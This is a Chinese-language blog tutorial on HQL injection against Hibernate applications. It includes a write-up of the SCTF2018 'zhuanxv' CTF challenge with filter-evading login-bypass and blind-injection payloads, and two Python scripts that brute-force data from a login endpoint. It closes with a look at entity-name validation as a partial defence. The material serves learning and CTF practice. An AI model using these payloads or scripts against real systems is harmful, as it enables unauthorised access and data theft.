---
title: HQL注入
author: Creexile
date: 2025-10-23
lastMod: 2025-10-23
summary: '你和SQL注入是什么关系'
cover: ''
category: '渗透'
draft: false
comments: false
sticky: 0
tags: [HQL注入]
---

参考连接

1. [freebuf-『渗透测试』HQL注入之从学会发音到逐渐遗忘](https://www.freebuf.com/articles/web/287849.html)
2. [博客园-hsql整理](https://www.cnblogs.com/fengyouheng/p/11013013.html)
3. [博客园-攻防世界-web-Zhuanxv（任意文件读取、万能密钥、sql盲注）](https://www.cnblogs.com/zhengna/p/13684201.html)
4. [csdn-xctf攻防世界 Web高手进阶区 Zhuanxv](https://blog.csdn.net/l8947943/article/details/122372989)

工具: HQLMap

# 介绍

HQL是Hibernate Query Language的简写, 类比SQL

Hibernate是一种ORM框架，用来映射与tables相关的类定义（代码），可以自动生成SQL语句，自动执行，在Java生态系统中很受欢迎

HQL是Hibernate独有的面向对象的查询语言。在用Hibernate作为查询中间层的时候,Hibernate引擎会对HQL进行解析，翻译成SQL，再交给数据库执行

> 这里可以得知, 如果发生错误会有两个来源, 一种来自Hibernate引擎，一种来自数据库

HQL注入没有延时函数，没有系统函数，更没有元数据表等

Hibernate支持UNION的。但是想使用UNION，必须在模型的关系明确后，这种情况比较少见，所以会导致UNION失败

# 原理

Hibernate可以使用原生SQL和HQL, SQL自己去学

所有的注入的漏洞点都是存在于输入的位置且原因均为直接拼接，`HQL`注入也不例外

```java
getHibernateTemplate().find("from User where name ='" + name + "'");
```

HQL注入的常见类型可以总结为两种：布尔盲注和报错注入

因为HQL没有延时函数也没有元数据表，当使用布尔盲注的时候，表名和字段名只能靠猜

# 例题

sctf2018的zhuanxv题目, 其登录框存在HQL注入

从报错信息中可以看到表名以及两个字段名; 尝试常规的`1' or '1'='1`发现, 等号和空格被过滤

通过常规的sql注入绕过即可, `<>`或者`like`对等号进行绕过，空格用`%09`或者`%0A`

```sql
1'or'1'like'1
```

HQL和SQL稍有不同, 利用SQL的万能密码是不行的, 需要加上两遍or

```sql
1'or'1'like'1'or'1'like'1
1'or'1'<>''or'1'
```

现在就能进入后台了, 可惜我们的目的是获取数据

首先构造一个错误的语句, 进行报错注入

`HQL`的报错注入，一般是构造不同数据类型直接的转换，比如字符与数字之间的比较

下面是一个简单的例子,

```sql
1'and(select 'AAA' from User)<>1 and''<>
```

正常来说，上述语句可能会返回如下报错信息：`Data conversion error converting "AAA";`, 题目禁止了这条路

那就用布尔盲注

```sql
1'or(select%09'a'from%09User)like'b'or'1'like'1
```

且我们获取数据的语句，有两种方式，一种是常规盲注的字符串切片，利用`substring`等函数，例如：

```sql
1'or(select%09substring(name,1,1)%09from%09User)like'a'or'1'like'1
```

而另一种是利用`%`，当然，需要编码为`%25`

```sql
1'or(select%09name%09from%09User)like'h%25'or'1'like'1
```

盲注不上脚本都是狠人

## 脚本

大佬那里扒拉的

```python
# -*- coding: utf-8 -*-
# Author:Obsidian
# Date: 2021年5月30日 14:11:42
import requests
url = 'http://127.0.0.1:9032/zhuanxvlogin'
s = '0123456789abcdefghijklmnopqrstuvwxyz'
flag=''
def check(exp):
	payload = {'user.name':exp,'user.password':'a'}
	result = requests.post(url,payload).content
	return 'Dream' in result
for i in range(1,100):
	for ss in s:
		exp = '1\'or(select\nsubstring(name,%d,1)\nfrom\nUser)like\'%s\'or\'1\'like\'1' %(i,ss)
		#exp = '1\'or(select\nname\nfrom\nUser)like\'%s%%\'or\'1\'like\'1' %(flag+ss)
		if check(exp):
			flag += ss
			break
	print 'flag is :'+flag
```

官方的:

```python
import requests
s=requests.session()

flag=''
for i in range(1,50):
    p=''
    for j in range(1,255):
        payload = "(select%0Aascii(substr(id,"+str(i)+",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'"+str(j)+"'"
        #print payload
        url="http://220.249.52.133:33772/zhuanxvlogin?user.name=admin'%0Aor%0A"+payload+"%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        r1=s.get(url)
        #print url
        #print len(r1.text)
        if len(r1.text)>20000 and p!='':
            flag+=p
            print i,flag
            break
        p=chr(j)
```

payload 中的 `id<2` 条件用于限定子查询只返回一行数据。如果表中有多条记录，子查询可能会返回多行，导致 SQL 语法错误或无法正常进行布尔比较

# 漏洞

[CVE-2024-49203 - Querydsl JPA orderBy HQL注入漏洞](../漏洞/漏洞复现/CVE-2024-49203.md)

# 过滤

遇到过一些奇葩的相对安全的过滤方式:

有时需要根据用户输入动态决定查询的实体类(即 from 子句后的类名), 这个很明显是一个拼接注入

```java
String className = request.getParameter("className");
String hql = "select o from " + className + " o where o.id = ?";
```

**它们的解决方法是**: 利用 Hibernate 的 `ClassMetadata` 验证验证用户输入的类名确实是系统中已定义的、可信的实体类

很神奇吧?

Hibernate 的 `SessionFactory` 维护了所有实体类的元数据(`ClassMetadata`); 通过 `getClassMetadata(className)` 可以检查给定类名是否对应一个已注册的实体

如果类名无效，该方法会抛出异常（如 `UnknownEntityException`）, 因此我们可以捕获该异常并拒绝请求，从而避免不可信的字符串拼接

```java
public String buildSafeHql(String className) {
    // 通过 Hibernate 元数据验证类名是否存在且为实体
    ClassMetadata metadata;
    try {
        metadata = HibernateTemplateEx.getInstance().getClassMetadata(className);
    } catch (UnknownEntityException e) {
        // 记录日志，返回错误或抛出业务异常
        throw new IllegalArgumentException("Invalid entity class: " + className);
    }

    // 可选：进一步检查该类名是否符合预期的命名规范（如包前缀）
    if (!className.startsWith("com.example.model.")) {
        throw new IllegalArgumentException("Entity class not in allowed package");
    }

    // 安全拼接 HQL（类名部分已通过验证）
    String hql = "select o from " + className + " o where o.id = :id";
    return hql;
}
```

你问为什么是相对安全, 因为本质它还是拼接

1. 仅保证了 from 子句中的类名安全, 查询的其他部分必须使用参数绑定或白名单验证; 类名验证不能替代参数化查询
2. JPA 允许通过 `@Entity(name = "custom_name")` 指定一个不同于 Java 类名的实体名称, 如果系统使用了这类自定义名称则依然有注入风险
3. 其实是我绕不过这个方式, 我就扔在这里看看有没有人能研究出来
